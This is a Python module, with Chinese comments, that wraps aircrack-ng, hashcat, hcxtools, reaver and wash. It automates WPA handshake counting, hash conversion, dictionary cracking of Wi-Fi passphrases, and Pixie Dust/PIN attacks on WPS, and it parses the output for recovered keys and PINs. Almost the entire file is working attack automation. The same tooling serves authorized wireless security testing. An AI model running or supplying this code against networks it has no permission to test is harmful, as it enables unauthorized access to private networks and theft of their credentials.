"""外部破解/抓包工具封装（aircrack-ng / hashcat / hcxtools）。"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Callable

from ..system.deps import is_installed
from ..system.runner import Runner

KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[\s*(.*?)\s*\]")
HANDSHAKE_RE = re.compile(r"(\d+)\s+handshake", re.IGNORECASE)
PMKID_RE = re.compile(r"(\d+)\s+PMKID", re.IGNORECASE)
WPS_PIN_RE = re.compile(r"WPS PIN:\s*'?([0-9]{8})'?", re.IGNORECASE)
WPS_PSK_RE = re.compile(r"WPA PSK:\s*'?(.+?)'?\s*$", re.IGNORECASE | re.MULTILINE)
WPS_LOCK_RE = re.compile(r"(WPS PIN attempts exceeded|Detected AP rate limiting|locked)", re.IGNORECASE)


async def count_handshakes(runner: Runner, cap_path: str | Path) -> int:
    """统计抓包中的握手数量（优先 tshark，回退 aircrack-ng）。"""
    path = str(cap_path)
    if not Path(path).exists():
        return 0
    if is_installed("tshark"):
        result = await runner.run(
            ["tshark", "-r", path, "-Y", "eapol", "-T", "fields", "-e", "eapol.type"],
            timeout=40,
        )
        if result.ok:
            msgs = [line for line in result.stdout.splitlines() if line.strip()]
            # EAPOL type 3 = Key；一次握手含 M1-M4
            return max(1, len(msgs) // 2) if msgs else 0
    if is_installed("aircrack-ng"):
        result = await runner.run(["aircrack-ng", path], timeout=60)
        text = result.text
        match = HANDSHAKE_RE.search(text)
        if match:
            return int(match.group(1))
        if "PMKID" in text.upper():
            return 1
    return 0


async def convert_to_22000(
    runner: Runner, source: str | Path, output: str | Path
) -> tuple[bool, int, str]:
    """pcapng → hashcat 22000。返回 (成功, 行数, 说明)。"""
    if not is_installed("hcxpcapngtool"):
        return False, 0, "hcxpcapngtool 未安装（apt install hcxtools）"
    result = await runner.run(
        ["hcxpcapngtool", "-o", str(output), str(source)], timeout=90
    )
    path = Path(output)
    lines = 0
    if path.exists():
        lines = sum(
            1
            for line in path.read_text(encoding="utf-8", errors="replace").splitlines()
            if line.startswith("WPA*")
        )
    return result.ok and lines > 0, lines, result.text[-1500:]


async def aircrack_crack(
    runner: Runner,
    cap_path: str | Path,
    wordlist: str | Path,
    *,
    bssid: str = "",
    timeout: float = 3600,
    on_line: Callable[[str], None] | None = None,
) -> tuple[str | None, str]:
    cmd = ["aircrack-ng", "-w", str(wordlist)]
    if bssid:
        cmd += ["-b", bssid]
    cmd.append(str(cap_path))
    result = await runner.run(cmd, timeout=timeout, on_line=on_line)
    match = KEY_FOUND_RE.search(result.text)
    return (match.group(1), result.text) if match else (None, result.text)


async def hashcat_crack(
    runner: Runner,
    hash_file: str | Path,
    wordlist: str | Path,
    run_dir: str | Path,
    *,
    timeout: float = 3600,
    on_line: Callable[[str], None] | None = None,
) -> tuple[str | None, str]:
    """hashcat mode 22000 字典攻击，返回 (口令, 输出)。"""
    if not is_installed("hashcat"):
        return None, "hashcat 未安装"
    run_dir = Path(run_dir)
    run_dir.mkdir(parents=True, exist_ok=True)
    potfile = run_dir / "hashcat.potfile"
    outfile = run_dir / "cracked.txt"
    if outfile.exists():
        outfile.unlink()
    cmd = [
        "hashcat",
        "-m", "22000",
        "-a", "0",
        "--potfile-path", str(potfile),
        "--outfile", str(outfile),
        "--outfile-format", "2",
        "--status",
        "--status-timer", "3",
        "--quiet",
        str(hash_file),
        str(wordlist),
    ]
    result = await runner.run(cmd, timeout=timeout, on_line=on_line)
    if outfile.exists():
        for line in outfile.read_text(encoding="utf-8", errors="replace").splitlines():
            if line.strip():
                return line.strip(), result.text
    # 兼容：potfile 中可能已有结果
    if potfile.exists():
        for line in potfile.read_text(encoding="utf-8", errors="replace").splitlines():
            if ":" in line:
                return line.rsplit(":", 1)[-1], result.text
    return None, result.text


async def reaver_attack(
    runner: Runner,
    iface: str,
    bssid: str,
    channel: int,
    *,
    pixie: bool = False,
    pin: str | None = None,
    timeout: float = 900,
    on_line: Callable[[str], None] | None = None,
) -> dict:
    """调用 reaver 执行 Pixie Dust 或 PIN 攻击。"""
    cmd = ["reaver", "-i", iface, "-b", bssid, "-c", str(channel), "-vv"]
    if pixie:
        cmd.append("-K")
        cmd.append("1")
    if pin:
        cmd += ["-p", pin]
    result = await runner.run(cmd, timeout=timeout, on_line=on_line)
    text = result.text
    pin_match = WPS_PIN_RE.search(text)
    psk_match = WPS_PSK_RE.search(text)
    return {
        "ok": bool(psk_match or pin_match),
        "pin": pin_match.group(1) if pin_match else "",
        "psk": psk_match.group(1).strip() if psk_match else "",
        "locked": bool(WPS_LOCK_RE.search(text)),
        "output": text[-8000:],
        "timed_out": result.timed_out,
    }


async def wash_scan(runner: Runner, iface: str, timeout: float = 30) -> list[dict]:
    """扫描开启 WPS 的 AP（wash）。"""
    if not is_installed("wash"):
        return []
    result = await runner.run(["wash", "-i", iface], timeout=timeout)
    out: list[dict] = []
    for line in result.stdout.splitlines():
        match = re.match(
            r"^([0-9A-Fa-f:]{17})\s+(\S+)\s+(\d+)\s+(-?\d+)\s+(\S+)\s+(\S+)\s*$", line.strip()
        )
        if match:
            out.append(
                {
                    "bssid": match.group(1).lower(),
                    "channel": int(match.group(2)),
                    "power": int(match.group(3)),
                    "wps_version": match.group(5),
                    "wps_locked": match.group(6).lower() in {"yes", "locked"},
                }
            )
    return out
